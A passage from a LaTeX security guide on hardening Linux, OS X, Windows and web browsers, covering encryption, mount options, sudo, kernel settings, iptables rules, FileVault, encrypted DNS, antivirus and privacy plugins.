				\item Using an uncommon or nonsensical phrase such as ``Correct horse battery staple''\footnote{\url{https://xkcd.com/936/}}
				\item using multiple numbers, letters and symbols. 
				\item Randomly generated using a password manager. %TODO: \ref this to browser hardening PMs 
				\item Longer than 12 characters. 
			\end{itemize}
		\subsection{Password Hashing}
			Linux stores hashed passwords in ``/etc/shadow''. 
			It is worthwhile checking the settings of your Linux install to ensure that passwords are hashed properly and with a number of rounds. Thus, open ``/etc/pam.d/passwd'' and ensure that it contains the line:
			\begin{quote}
				password required pam\_unix.so $\textbf{sha512}$ shadow $\textbf{rounds=65536}$
			\end{quote}
		\subsection{Disk Encryption}
			is the process of automatically cryptographically protecting a part or all of a storage device.
			\footnote{\url{https://wiki.archlinux.org/index.php/Disk\_encryption}}
			When properly utilized, disk encryption will ensure that only a trusted user will be able to unlock the computer. 
			However, the system will still be vulnerable to remote attacks, cold boot attacks and coercion (though this can be mitigated through plausible deniability)
			The following is a description of the types of encryption and their effects on security"
			\begin{description}
				\item[Data Encryption] Encrypting nothing more than the data. 
					This is useful for privacy concerns and is the easiest to implement. 
					However, date encryption will not protect from OS tampering such as installing key loggers as well as cache attacks, taking advantage of data cached in locations such as ``/tmp''.
				\item[System Encryption] Encrypting the whole OS and all user data. 
					This prevents the two downfalls of data encryption by ensuring that any tampering will cause a garbled output on the OS disk and that call caches are encrypted. 
					However, this requires that the boot system be aware of the encryption and that a password is entered before boot. 
			\end{description}
			In order to achieve this, there are two types of encryption which may be utilized:
			\begin{description}
				\item[Stacked Filesystem Encryption] A designated folder within the filesystem which encrypts files before they are written to the disk. 
					This means that the files will be visible from the encrypted filesystem, but the names and data will be encrypted until unlocked. 
					This is a simple means of Data Encryption. 
				\item[Block Device Encryption] Operates below the filesystem, encrypting the filesystem and the files contained within it. 
					In this type of encryption, the contents of the whole device will look like random data rather than a filesystem filled with random files. 
			\end{description}
		\subsection{Mount options}
			When setting up a secure environment, one should take care to give the least permission required to conduct a task. 
			Thus, when mounting file systems, it is best to limit what can be done with the data on the system.
			There are three restrictions which can be placed on a mounted filesystem:
			\begin{description}
				\item[nodev] Do not interpret character or block special devices on the filesystem
				\item[nosuid] Do not allow set-user-identifier or set-group-identifier bits to take effect
				\item[noexec] Do not allow execution of binaries or other files found in the filesystem. 
			\end{description}
			A basic guide for what common filesystems can be mounted with which options can be found in table \ref{tab:mountOptions}, use these within the file ``/etc/fstab''.
			\begin{table}[htb]
				\centering
				\begin{adjustbox}{max width=1\textwidth}
				\begin{tabular}{| l | l | l | l |}
					\hline
					$\textbf{Partition}$ & $\textbf{nodev}$ & $\textbf{nosuid}$ & $\textbf{noexec}$ \\ \hline
					/var  &		yes &	yes &	yes \\ \hline
					/home &		yes &	yes &	if you do not code or use wine \\ \hline
					/dev/shm &	yes &	yes &	yes \\ \hline
					/tmp &		yes &	yes &	breaks compiling packages \\ \hline
					/boot &		yes &	yes &	yes \\ \hline
				\end{tabular}
			\end{adjustbox}
				\caption{Common filesystem restrictions}
				\label{tab:mountOptions}
			\end{table}
			\subsection{File Permissions}
				The default file permissions allow almost all files to be read by all users, while writing and executing is reserved for the owner and root. 
				This means that if any user is compromised, most files on the system can be stolen. 
				Furthermore, it means that the attacker can use the systems configuration files to determine likely privilege escalation or pivot points. 
				To solve this, important configuration files permissions should be set to 700 and the default umask should be set to 077. 
				This will ensure that only root can read and change configuration files and only root and the owner can read their own files. 
				This is especially important in a multi-user system, where other users would otherwise be able to read all users data. 
			\subsection{Users}
				One of the first things to do on a new Linux install is to create a new user to use rather than root. 
				This removes a large point of failure in that if the root account is compromised, the whole system is.\\ 
				To add to this, one should look to implement lockouts on failed login attempts through the pam\_tally\footnote{\url{http://linux.die.net/man/8/pam\_tally}} system.
				This system will ensure that if a user attempts to access the system with an incorrect password, they will be locked out, either for a given time, or until unlocked by the root user. 
				This avoids an opportunistic malicious user attempting to guess the password. \\
				Another means of securing users is to limit the number of processes which can be spawned by an individual user. 
				This will limit the effect of a user account being used to run a denial of service (DoS) attack on the system. 
				Furthermore, it will disallow actions such as fork bombs from bringing the whole system down. 
				This can usually be achieved by adding the following lines to ``/etc/security/limits.conf''
				\begin{quote}
					\begin{flushleft}
						\** soft nproc 100 \\
						\** hard nproc 200 \\
					\end{flushleft}
				\end{quote}
				
				In addition to this, services which are particularly vulnerable
				---such as any Internet facing services---
				should be run from an additional restricted user account. 
				This will ensure that if these services are targeted, it is more difficult to escalate to a privilege or root account. 
				Furthermore, by implementing this alongside the other recommendations specified here, 
				it becomes difficult for an attacker to take data, due to the fact that they cannot see most of the filesystem.

			\subsection{Restricting use of root}
				\begin{itemize}
					\item The sudo command should be used rather than su due to the following reasons:
						\begin{itemize}
							\item It logs commands and the users which invoked them
							\item Root password is held secure. 
							\item Prevents accidental execution. 
							\item Individual commands may be enabled for users or group through the sudoers file. 
						\end{itemize}
					\item sudoedit or sudo -e should be used rather than running an editor as root. 
						To do this, add ``SUDO\_EDITOR=<editor>'' to your environmental variables.
					\item Restrict root login both locally and via SSH. 
				\end{itemize}
			\subsection{Mandatory Access Control}
				MAC, as opposed to the Discretionary Access Control (DAC) used on most Linux systems is a rule set which designates which actions can be taken on which files and directories. 
				This rule set is created by the root user and unlike DAC cannot be altered by the users of the system. 
				While any MAC system will be far better than DAC, one must ensure that MAC is properly setup, as malicious execution during the learning phase could create vulnerabilities which will go undetected. 
				Furthermore, on the desktop, due to the wide variety of tasks which are completed, a poorly setup MAC will either be far too permissive or far too restrictive. 
				%TODO: Think about writing out the types here. Think about linking the implementations. 
				MAC can also be utilized as a means of creating application white listing.
				While difficult to create a strong policy, it is one of the best methods for running application white listing on Linux, 
				due to the fact that there is no pre-built white listing tool. 
			\subsection{Kernel Hardening}
				The following are the common steps used to harden the Linux Kernel. 
				\begin{description}
					\item[Restricting access to kernel logs]
						These logs contain information which may be useful to an attacker, such as the software currently running and sensitive memory addresses. 
						To restrict access to these logs, add the line ``kernel.kptr\_restrict = 1'' to the file ``/etc/sysctl.d/50-kptr-restrict.conf''
					\item[Hidepid] 
						The kernel will hide the pid of processes owned by other users if this is enabled. This is done by mounting the ``/proc'' filesystem with the option ``hidepid=1''. 
					\item[Grsecurity\footnote{\url{https://en.wikibooks.org/wiki/Grsecurity}}]
						is a kernel which has been patched with multiple security enhancements. 
						Both the kernel and userspace are hardened against common memory corruption vulnerabilities along with the addition of PaX integration and a role based MAC system. This is the easiest way to secure the kernel itself against exploitation. 
					\item[PaX] PaX is a Kernel patch which implements a number of security countermeasures. 
						It will lock down which parts of memory contain code and which contain data, ensuring that the latter cannot be executed by the CPU. 
						Furthermore, it will randomize the memory layout of the computer, making it far more difficult to determine what part of memory is being operated on and thus far harder to exploit a program successfully. 
				\end{description}
				\subsection{Sandboxing with firejail}
					Sandboxing is an important part of running a secure system. 
					It allows the user to run a program knowing that only specified changes (or none at all) will be made to disk. 
					Firejail\footnote{\url{https://firejail.wordpress.com/documentation-2/}} gives an easy way to do this through it's commandline interface. 
					The command ``firejail <program>'' will execute ``program'' in a sandbox. 
					For greater security, the following command will block the program from writing to disk, effectively blocking all permanent changes
					\begin{lstlisting}[style=CLI]
						$ firejail --seccomp --private <program>
					\end{lstlisting}
					While this does not mean that the program cannot be used as a means to attack the machine, it does make it far more difficult. 
					However, it also means that nothing can be saved from within the program, making it far harder to use. 
				\subsection{Firewall} 
					A firewall is a system designed to prevent unauthorized access to a system by only allowing a specific set of packets to be transmitted through to the network.\footnote{\url{https://wiki.archlinux.org/index.php/Firewalls}}
					While they can be in either hardware or software, this section will focus on the software implementation, as this is the implementation which can be setup on all Linux systems. 

					On Linux, the most common tool used for creating a firewall is ``iptables''.\footnote{\url{linux.die.net/man/8/iptables}}
					This tool is used to inspect, forward, redirect or drop IPv4 packets, based on a set of rules written by its user. 
					It is built into the Linux kernel, along with a set of basic rules, which will not be sufficient for any level of security. 
					These rules consist of a predate---the potential matches for the rule---and an action which will be enacted when the predicate is true. 
					These rules are then read in a chain, which allows iptables to select the correct action based on the rules it was given.\footnote{\url{https://www.frozentux.net/iptables-tutorial/images/tables\_traverse.jpg}}
					Within this, there are a number of tables.
					These tables are split into a number of chains, which when linked together will give the order in which the rules are looked at. 
					For the purpose of creating a firewall, only the filter table will be referred to within this section. 
					
					\subsubsection{Simple Firewall}
						This section is a basic guide on the creation of a simple firewall.\footnote{\url{https://wiki.archlinux.org/index.php/Simple\_stateful\_firewall}}
						It is not a full security implementation, but rather an exercise in creating the iptables rules which are required. 
						Note that this, when done on a remote machine will lock you out. 
						Please either conduct these steps locally or have another means of getting into the system. 
						Also before starting, please ensure that there are no iptables rules on your system. 
						These can be removed by running the command:
						\begin{lstlisting}[style=CLI]
							# iptables-restore < /etc/iptables/empty.rules
						\end{lstlisting}

						The first step in this is to set up the necessary chains with the commands:
						\begin{lstlisting}[style=CLI]
							# iptables -N TCP 
							# iptables -N UDP  
						\end{lstlisting}
						Then we should set the FORWARD chain which is usually used in routers and NAT to DROP with:
						\begin{lstlisting}[style=CLI]
							# iptables -P FORWARD DROP
						\end{lstlisting}
						For the next part, we will be telling the firewall to allow all outgoing connections. 
						This is generally a bad idea, but setting up the correct firewall settings is beyond the scope of this. 
						\begin{lstlisting}[style=CLI]
							# iptables -P OUTPUT ACCEPT
						\end{lstlisting}
						We will now start setting up the incoming rules. 
						The default rules for this is do drop the packets, meaning that they will not be accepted and no response will be sent. 
						However, we will then add other rules on top of this to ensure that communication is not lost. 
						The following rule will allow ICMP messages which have are related to an existing connection to be passed through the firewall. 
						\begin{lstlisting}[style=CLI]
							# iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
						\end{lstlisting}
						The second rule will allow all connections on the loopback address, which is designed to allow software on one machine to communicate. 
						\begin{lstlisting}[style=CLI]
							# iptables -A INPUT -i lo -j ACCEPT
						\end{lstlisting}
						This next rule will drop all packets which are not valid. 
						This means that something about the packets does not make sense, such as a corrupted header or an incorrect checksum. 
						These packets will be dropped with no response as they are often used in network scanning. 
						\begin{lstlisting}[style=CLI]
							# iptables -A INPUT -m conntrack --ctstate INVALID -j DROP
						\end{lstlisting}

						To allow packets coming through this chain to be attached to our new TCP and UDP chains, use the following commands:
						\begin{lstlisting}[style=CLI]
							# iptables -A INPUT -p udp -m conntrack --ctstate NEW -j UDP 
							# iptables -A INPUT -p tcp --syn -m conntrack --ctstate NEW -j TCP 
						\end{lstlisting}
						These next commands will drop all failed UDP and TCP connections. 
						This is done for security, as a common network mapping technique uses the fact that by protocol, failed TCP packets should reply with an RST packet and failed UDP should reply with an ICMP port unreachable. 
						The following commands will stop both of these behaviors. 
						\begin{lstlisting}[style=CLI]
							# iptables -A INPUT -p udp -j DROP
							# iptables -A INPUT -p tcp -j DROP
						\end{lstlisting}
						Finally, we will drop all other protocols in case anything else was attempted. 
						\begin{lstlisting}[style=CLI]
							# iptables -A INPUT -j DROP
						\end{lstlisting}
						You may also want to open up a number of application specific ports such as port 22 for SSH. 
						This can be done using the following command:
						\begin{lstlisting}[style=CLI]
							# iptables -A <Protocol> -p <Protocol> --dport <port> -j ACCEPT
						\end{lstlisting}
						Finally, this whole setup can be saved using the command ``iptables-save''. 

		
				\subsection{Physical security}
					Given enough time and resources, physical access is root access. 
					However, a high level of security for both the operating system and data can be obtained through the use of a number of layers such as boot security and encryption. 
					It must be noted that the system can be tampered with by other means such as malicious hardware which can read and alter the memory of the computer while it runs. While there is little that can be done to avoid this outside checking for new hardware, it is unlikely that an attacker will be this knowledgeable or determined. 
					\begin{itemize}
						\item Implement a BIOS/UEFI password. 
							Though these are not completely secure, they ensure that the opportunistic attacker will be unable to alter the boot devices of the computer, forcing them to use your secured OS. 
							However, these can be worked around on most systems by wiping the CMOS. 
						\item Boot loader security should be implemented by either disabling editing of boot devices or adding a password to the boot loader. 
							This will stop the ``init=/bin/sh'' attack amongst others. 
						\item Deny root login from the console. 
							This would mean that the attacker would need both a user name and password to access the system. 
						\item Set an automatic logout or use the lock features of the DE/WM that you use. 
					\end{itemize}
	\section{OS X Hardening}
		Hardening an OS X install\footnote{\url{https://github.com/drduh/OS-X-Security-and-Privacy-Guide}}, while similar in concept to Linux, is different due to the configuration system used by OS X. 
		Since it was derived from NeXTSTEP, it's configuration is written into binary plist files, which must be edited. 
		This guide will use the provided ``defaults'' program to edit specific parts of these files. 
		However, if you would like to edit them manually or learn more about the structure of these files, I recommend a text editor such as ``TextWrangler'' which can convert these files to and from binary. 

		\subsection{Full Disk Encryption}
			The built in FileVault utility makes full disk encryption on OS X easy. 
			This means that unless you need to access your hard drive from another computer for a good reason, FileVault should be enabled. 
			Furthermore, with more recent systems, FileVault will encrypt in hardware, ensuring that minimal performance losses are noticed. 
			As the initial encryption is based on the OS X PRNG, it is recommended that you use your system for a little while before enabling FileVault. 

			To enable FileVault, open the ``Security and Privacy'' settings and select enable. 
			This will then ask you to set a password, which will be used to encrypt your files.\footnote{\url{https://eprint.iacr.org/2012/374.pdf}} 
			Furthermore, it will generate a recovery key, which you should store in a secure place, as it is your only means of recovering data if you lose your password. 
			FileVault will offer to store this key with Apple, if you do this, you are removing any security you achieve by encrypting in the first place, so decline this offer. 
			At this point, you should alter some of the default key storage behaviors of OS X such as erasing the key from memory on sleep an enforcing hibernation. 
			This will mean that you do not have to manually turn off the computer for the encryption to be secure---the system need only be hibernating. 
			To do this, use the following commands:
			\begin{lstlisting}[style=CLI]
				# pmset -a destroyfvkeyonstandby 1
				# pmset -a hibernatemode 25
			\end{lstlisting}
		\subsection{Firmware password}
			Unlike windows and Linux systems where the UEFI or BIOS are transparent to the user, Apple Mac computers attempt to hide this utility. 
			While it is not easy to access to the unaware, this is no means of security. 
			Thus, it is recommended that a password be placed on this utility. 
			This can be done through the following steps:
			\begin{enumerate}
				\item Holding the keys \keys{\cmd + R} on boot to enter OS X Recovery mode.
				\item Choose ``Firmware Password Utility''
				\item Choose `` Turn On Firmware Password''
				\item Enter your password and quit the utility. 
				\item Hold the \Alt{} key during the next boot.
			\end{enumerate}
		\subsection{Firewall}
			The default OS X firewall is a good start for a blocking firewall. 
			However, it will not allow you to monitor connections, nor block outgoing connections.
			To enable it, use the command:
			\begin{lstlisting}[style=CLI]
				# defaults write /Library/Preferences/com.apple.alf globalstate -bool true
			\end{lstlisting}
			To enable logging of blocked connections:
			\begin{lstlisting}[style=CLI]
				# defaults write /Library/Preferences/com.apple.alf loggingenabled -bool true
			\end{lstlisting}
			To drop ICMP ping requests and TCP/UDP traffic on closed ports:
			\begin{lstlisting}[style=CLI]
				# defaults write /Library/Preferences/com.apple.alf stealthenabled -bool true
			\end{lstlisting}
			See chapter \ref{ch:NetworkPenetration} for why this would be a good idea. 

			Finally, to prompt you for every application which attempts to receive an incoming connection, rather than allowing signed applications to receive this by default, run:
			\begin{lstlisting}[style=CLI]
				# defaults write /Library/Preferences/com.apple.alf allowsignedenabled -bool false
			\end{lstlisting}

			At this point, you may wish to overcome the inability of the standard firewall for monitoring and out bound connections. 
			This can be done through either third party firewalls or the kernel firewall, ``pfctl''. 
			While I recommend the latter as it is built in, I recommend that you do more reading before enabling it. 

			\subsection{Services}
				OS X comes with a number of services which most people will not use. 
				Furthermore, many of these services phone home to apple or another organization, either for monitoring or content purposes. 
				Use the following commands to gather information\footnote{\url{http://cirrusj.github.io/Yosemite-Stop-Launch/}} about the services currently running on your system:
				\begin{description}
					\item[launchctl list]
						view running user agents. 
						These programs were started by your user and are running in the background. 
					\item[sudo launchctl list]
						as above, but includes running system daemons.
					\item[launchctl list <Agent Name>]
						examine an agent or daemon.
					\item[defaults read <Agent.plist>]
						examine the job called by the agent. 
				\end{description}
				After using these tools, use tools such as the Unix manual and a web search to determine what the services do. 
				When reading a ``.plist'' file, look for ``Program'' or ``ProgramArguments'' to determine what the file runs, then search for the program. 
				To disable a service, use the following command:
				\begin{lstlisting}[style=CLI]
					# launchctl unload -w /System/Library/LaunchDaemons/com.apple.apsd.plist
				\end{lstlisting}
				Noting that removing the wrong service will leave you unable to boot, requiring that you enable it again in single user mode.
				To check which services have been disabled, run the following command:
				\begin{lstlisting}[style=CLI]
					$ find /var/db/com.apple.xpc.launchd/ -type f -print -exec defaults read {} \textbackslash; 2>/dev/null
				\end{lstlisting}
			\subsection{Spotlight}
				Spotlight is an exceptionally useful tool. 
				It is by far the quickest way to get information and launch programs on an OS X system. 
				However, in order to do this, is will often send data to both Apple and Microsoft. 
				To disable this, open Spotlight Preferences and uncheck ``Bing Web Searches'' and ``Allow Spotlight Suggestions in Spotlight and Look up''. 
				You may also need to disable this in Safari Preferences under ``Search''. 
				This will stop Spotlight from phoning home on every search. 
			\subsection{Homebrew}
				Many of the user land tools installed with OS X or the xcode package are vastly out of date BSD versions. 
				This can be resolved through the use of the Homebrew package manager. 
				This package manager uses TLS to pull down install scripts from it's git hub repository on Github.com, meaning that it is mostly secure so long as you trust the repository. 
				Nonetheless, it is recommended that you read through these scripts before running them, otherwise it is no different to running any arbitrary code on your system. 
				See the \href{https://github.com/Homebrew/homebrew}{Homebrew Github repository} for more information and installation instructions. 
				This will be used in further parts of this guide.
			\subsection{OS X Command Line Tools}
				The versions of many of the tools released with OS X are exceptionally out of date. 
				For example, at the time of writing, the version of the common version control system ``git'' was vulnerable to an arbitrary code execution vulnerability. 
				Often, Apple does not update these in a timely manner, meaning that you are left running vulnerable software for an extended amount of time. 
				Further pressing this issue is the fact that Apple has limited the access of the root user, stopping them from overwriting or symlinking the binary to one for a newer version. 

				However, this can be overcome.
				The first step is to disable System Integrity Protection. This should not be left permanently however, as it is a good security feature in itself. 
				In order to do this, reboot while holding \keys{\cmd + \shift + R} and open a terminal. The following command will disable SIP:
				\begin{lstlisting}[style=CLI]
					$ csrutil disable
				\end{lstlisting}
				The reverse operation will re-enable SIP when you are done. 

				Now you should install ``coreutils'' from Homebrew or another trusted source and link all relevant binaries in /bin to their Homebrew coreutils equivalent. 
				This will keep you up to date with the package that you have chosen, rather than waiting for Apple to update the system for you. 
			\subsection{DNS}
				DNS leaks are the most common way for a computer to leak the locations they are accessing. 
				There are two steps to securing DNS requests, caching and encryption, both of which will be covered in this section. 

				Caching can be done with the dnsmasq program, which will store the results of requests rather than forcing you to request the address on every boot. 
				Furthermore, this program hooks into dnscrypt to encrypt your DNS traffic. 
				To install and configure both of these programs, run the following Homebrew script and commands:
				\begin{lstlisting}[style=CLI]
					$ brew install dnsmasq --with-dnssec 
					$ mkdir -p /usr/local/etc 
					$ cp /usr/local/opt/dnsmasq/dnsmasq.conf.example /usr/local/etc/dnsmasq.conf 
				\end{lstlisting} %TODO: This gets hyphenated. 
				At this point, you should configure both dnsmasq and dnssec to your preferences.\footnote{\url{https://wiki.gentoo.org/wiki/Dnsmasq}}	
				The configuration file is well commented, read through this as it should tell you what you need to enable. 

				Once configured, the following commands will properly install and launch the program. 
				\begin{lstlisting}[style=CLI]
					# cp -fv /usr/local/opt/dnsmasq/*.plist /Library/LaunchDaemons 
					# chown root /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plist 
					# launchctl load /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plist 
				\end{lstlisting}
				Then enable the local DNS server in the preferences for your network and any VPN that you are using. 

				In order to encrypt this traffic, you will now need to install dnscrypt. 
				\begin{lstlisting}[style=CLI]
					$ brew install dnscrypt-proxy 
					# cp -fv /usr/local/opt/dnscrypt-proxy/*.plist /Library/LaunchDaemons 
					# chown root /Library/LaunchDaemons/homebrew.mxcl.dnscrypt-proxy.plist 
				\end{lstlisting}
				Then add the following line to ``/Library/LaunchDaemons/homebrew.mxcl.dnscrypt-proxy.plist'':
				\begin{quote}
					<string>\verb+--+local-address=127.0.0.1:5355</string>
				\end{quote}
				Below the line:
				\begin{quote}
					<string>/usr/local/opt/dnscrypt-proxy/sbin/dnscrypt-proxy</string>
				\end{quote}
				Then change the resolvers list string in the same file so that it doesn't break on update:
				\begin{quote}
					<string>\verb+--+resolvers-list=/usr/local/share/dnscrypt-proxy/dnscrypt-resolvers.csv</string>
				\end{quote}
				Finally, the program can be started with:
				\begin{lstlisting}[style=CLI]
					# launchctl load /Library/LaunchDaemons/homebrew.mxcl.dnscrypt-proxy.plist
				\end{lstlisting}

				This should leave you with a working, cached, validated and encrypted DNS setup. 
				Ensure that the DNS servers that you are using support this by checking with the website of the provider that you use or 
				selecting a new one from \href{https://www.opendns.com/}{OpenDNS}.
				
			\subsection{Captive Portal}
				When OS X connects to a new network it probes the network and launches a Captive Portal assistant if it cannot access the Internet. 
				This will load up an arbitrary website provided by the network, possibly serving malware with no user intervention. 
				This feature can be disabled with the following command:
				\begin{lstlisting}[style=CLI]
					# defaults write /Library/Preferences/SystemConfiguration/com.apple.captive.control Active -bool false
				\end{lstlisting}

			\subsection{OpenSSL}
				The OpenSSL version shipped with OS X is vastly out of date, not supporting many newer encryption technologies and causing significant security risks. 
				Though it may cause issues building some software, it is recommended that you switch to the Homebrew package and deal with these issues as they arise by utilizing the OS X binary temporarily.
				This version can be installed and linked using the following commands:
				\begin{lstlisting}[style=CLI]
					$ brew install openssl 
					$ brew link openssl --force
				\end{lstlisting}
				Similar issues appear in many of the OS X command line utilities. 
				You should search them out online. 
	\section{Windows Hardening}
		Can Windows even be hardened? The answer is yes, But not in the same way as Linux or Mac OS X.\footnote{\url{https://www.nsa.gov/ia/\_files/os/Win\_EMET/I43V\_EMET\_Rationale\_v3.4.pdf}}
		Hardening in windows takes the form of installing and enabling a set of programs, written by Microsoft amongst other companies. 
		These software packages do things such as mitigate data execution or attempt to recognize malicious code. 
		You would then remove all packages that are not used, reducing the surface area for attacks in the same way that you would for Linux or OS X. 
		While these mitigations are a significant improvement from a default windows install, it is far more expensive to secure a home windows install than to secure a Mac OS X or Linux install. 
		\subsection{Antivirus}
			The first and easiest means of securing a Windows system is to install an antivirus software package. 
			The most basic of these will run a signature check on every file within the filesystem, checking for known malware which has not been obfuscated. 
			While this is a good first step, it is trivial for malicious programmers to write code which will not be picked up by these systems. 
			Furthermore, they do not find new malware.
			The modern method is to run a heuristic scan on these files, attempting to determine what they do. 
			While this is still not reliable in finding malicious software, it is a significant improvement over signature only scanning. 
			Currently, the most renowned antivirus which runs heuristic scans is malwarebytes.\footnote{\url{https://www.malwarebytes.org/}}

		\subsection{Antiexploit}
			An extension to antivirus is the antiexploit suite. 
			This software purports to harden certain programs against attacks which are common to them. 
			It is designed to mitigate common attack vectors such as the browser or PDF reader. 
			This software works in much the same way as grsecurity and PAX on Linux, but targets individual programs, rather than the OS as a whole. 
			Malwarebytes again makes a well known antiexploit software\footnote{\url{https://www.malwarebytes.org/antiexploit/}} for windows. 
		\subsection{Data Execution Prevention}
			As you will find in Chapter \ref{ch:BinaryExploitation}, 
			one of the most common exploits is to alter a return address and execute code placed into the data of a program. 
			Data Execution Prevention (DEP) was created to mitigate this, attempting to detect when memory is used abnormally and shutting down the offending program. 
			To ensure that DEP is running, it is recommended that you open ``Performance Options'' and select ``Turn on DEP for all programs and services except those I select''. 
			This will enable the protection for all software installed. 
		\subsection{Application White listing}
			AppLocker is the main means of providing application white listing in the windows environment. 
			However, it is only available on Ultimate or Enterprise editions of windows. 
			If you have either of these, it is recommended that you follow Microsoft's guide\footnote{\url{https://technet.microsoft.com/en-us/library/dd759113.aspx}} on configuring it. 
			It is recommended that the configuration allow only those listed applications,
			ensuring that new or maliciously installed applications are not allowed to run. 
		\subsection{Disk Encryption}
			As above, Microsoft's bitlocker is available on the Ultimate and Enterprise versions of it's windows OS.
			In order to use this, it is recommended that you follow Microsoft's guide\footnote{\url{https://technet.microsoft.com/en-us/library/cc732774.aspx}}. 
			If you do not have the required versions of windows, software such as VeraCrypt\footnote{\url{https://veracrypt.codeplex.com/}} will allow you to run full disk encryption. 
			This software was forked from the discontinued TrueCrypt project. 
			TrueCrypt passed its most recent audit, but a number of issues were raised.
			VeraCrypt purports to have resolved these issues, but still uses the same code base. 
			If you do not wish to utilize VeraCrypt or upgrade to a higher version of windows, the alternative is to employ file or partition encryption. 
			This will encrypt only the data you have stored within the encrypted volume, rather than the OS itself. 
			While still secure for your data, this will leave the system open to offline manipulation,
			making it possible to install malware to read the data when it is next unlocked. 
		\subsection{Removal of Superfluous Software}
			The Windows OS comes with a number of pre-installed items that have no use to the average user and will do little more than provide another means of entry to an attacker. 
			These take two forms, services that run in the background and perform a task, and superfluous programs that you don't use. 

			In the former case, you will have to manually disable them. 
			Open ``services.msc'' for a list of these services then open PowerShell and run the command ``sc delete <service>. 
			This will remove the service from the system, ensuring that it cannot be automatically started. 
			However, doing this to the wrong service may make your computer unusable. 
			Know what it is that you are deleting before you remove it. 

			In the latter case, you will want to go through a number of lists. 
			The first of these is the Apps and Features list, which will give you the option to uninstall many of the programs that came with windows. 
			The second, which will give you more powerful options, is the ``Turn Windows features on or off'' option under programs and features. 
			This option will not allow you to uninstall the feature, but it will completely disable it. 
			For these options, turn anything that you do not use off. 
			However, as above, be sure that you do not use it. 
			Otherwise parts of your system may end up broken. 
	\section{Browser Hardening}
		Hardening a web browser is a long process. However it is easier than hardening an OS, and it's cross platform. 
		The first step, as with all things is to ensure that you trust the browser you are using and have it updated. 
		When deciding trust, ensure that the browser is coming form a source you trust, and preferably open source and well known. 
		Once this is complete, we begin looking into plugins and browser settings which will ensure that the browser has minimal surface area to attack. 
		\subsection{$\mu{}$Block Origin}
			$\mu$Block Origin is a tool which will block elements on every page which is loaded. 
			This tool works by reading from a list of filters which determine the common advertisements and other objects which should be blocked. 
			Furthermore, the tool uses these filters to determine which domains are likely to be malicious and blocks them, giving you the option to pass through to the site. 
			While this tool will not give you security against more complex attacks, it will filter out the majority of opportunistic attacks through elements such as advertisements and frames to known bad websites. 
			Once installed, run through the following check list: 
			\begin{itemize}
				\item select all three privacy options.
				\item select the filters which are useful to you. 
					Most of the filters down to regions are useful. However, many overlap. 
			\end{itemize}
		\subsection{Disconnect}
			Disconnect is designed to make the Internet faster and more private by blocking tracking found on most websites. 
			There is no setup for this plugin. Simply install it and allow it to do its thing. 
			It will check the connections requested by every website you go to against its list and block all those known to be tracking. 
		\subsection{Flash Control}
			Flash Control blocks both flash and HTML 5 elements which could contain malicious code. 
			The plugin is mainly useful for the flash blocking behavior, as flash is one of the most broken and commonly vulnerable pieces of web technology. 
			Furthermore, it is useful on its own to stop the ``one of my 50 tabs is playing music, but I don't know which one'' syndrome. 
			There is minimal setup for this plugin. Simply click the manage whitelist button and select all bar ``Disable Flash Control''. 
			You may also wish to add any sites that you know are good to the whitelist. 
			However, I prefer to simply allow Flash Control to block all flash elements. 
		\subsection{NoScript}
			NoScript is one of two script blocking plugins I recommend. 
			This plugin will block all javascript elements on all web pages unless they are manually allowed. 
			This means that the majority of malicious scripting attacks (such as XSS) will be blocked from the outset. 
			However, it also means that the majority of websites will be broken until they are allowed to run scripts. 
			I recommend running NoScript due to it's other features, such as:
			\begin{itemize}
				\item embedded element blocking (Java, Flash, Silverlight) 
				\item XSS blocking
				\item Application Boundaries Enforcer. 
				\item Clear Click. 
			\end{itemize}
			These are features which should be turned on in the settings of NoScript. 
		\subsection{Privacy Badger}
			Privacy Badger is another set and forget advertisement and tracking blocker. 
			This plugin will allow you to set allow, block cookies or block all for each connection that a website requests. 
			While it comes with a list which is quite good, you may want to manually adjust some pages to ensure that they will work or to block items which you think are malicious or unwanted. 
		\subsection{$\mu{}$Matrix}
			$\mu$Matrix is the second script blocking tool I recommend. 
			$\mu{}$Matrix will by default block all cookies, scripts, XHR, frames and various other elements, leaving only images and CSS. 
			The following are the settings which I use, these will ensure that security is held at a high level:
			\begin{itemize}
				\item Delete blocked cookies
				\item Delete local storage content set by blocked hostnames. 
				\item Clear browser cache every 60 minutes. 
				\item Spoof HTTP referrer. 
				\item Strict HTTPS.
				\item Block all hyperlink Auditing. 
				\item Spoof User-Agent. 
				\item All host files. 
			\end{itemize}
			Once this is setup, you will need to begin unblocking elements of websites by clicking on the $\mu{}$Matrix icon and selecting the top of the element to be unblocked. 
			Be sparing with this unblocking. However, you will need to do it for most sites to display. 
		\subsection{Sandboxing}
			Sandboxing is a feature of most modern browsers. It is usually enabled by default to avoid contamination between tabs. 
			However, this is not the full extent of browser sandboxing, which must be enabled manually. 
			Follow the steps outlined in the above chapter for your operating system to properly sandbox your browser. 
		\subsection{Browser Settings}
			The following chapter will be focused on Firefox and it's derivatives. 
			However, most of the settings will work for other browsers. 
			\begin{itemize}
				\item Settings under privacy:
					\begin{itemize}
						\item Request that sites not track you. 
						\item Use Tracking Protection in Private Windows. 
						\item Firefox will: Use custom settings for history. 
						\item Always use private browsing mode. (This will break all history and cached files) 
						\item Accept third-party cookies (Either from visited or never)
					\end{itemize}
				\item Settings under security:
					\begin{itemize}
						\item warn me when sites try to install add-ons
						\item Block reported attack sites
						\item Block reported web forgeries. 
					\end{itemize}
				\item Disable all sync. 
				\item Settings under Advanced:
					\begin{itemize}
						\item Data choices: Disable all.
						\item Update: Either Automatically or manual install. 
					\end{itemize}
			\end{itemize}
			%TODO: Add about:config chapter. 
		\subsection{Search}
			Google is one of the worst violators of user's privacy on the Internet. Second only to Facebook. 
			However, there are other options for search. \par 
			If you would like to retain the results that Google gives, but remove the tracking, Start page is your option. 
			Start page will act as a proxy between yourself and Google, allowing you to use the search features of Google as you normally would, but without the tracking. 
			This is a significant improvement to the current tracking which follows you across the Internet. \par 
			Another option is DuckDuckGo which was built from the ground up to ensure that the privacy of it's users is maintained. 
			This search engine has no contact with Google, but it also comes with a set of new features which can become useful once learned. 
			The issue with this search engine is that on occasion, the results will not be to the same standard. 
			Occasionally, someone will tell you to Google something, stating that the result is on the first page, but it will not be a result on DuckDuckGo. 
		\subsection{Multiple Browsers}
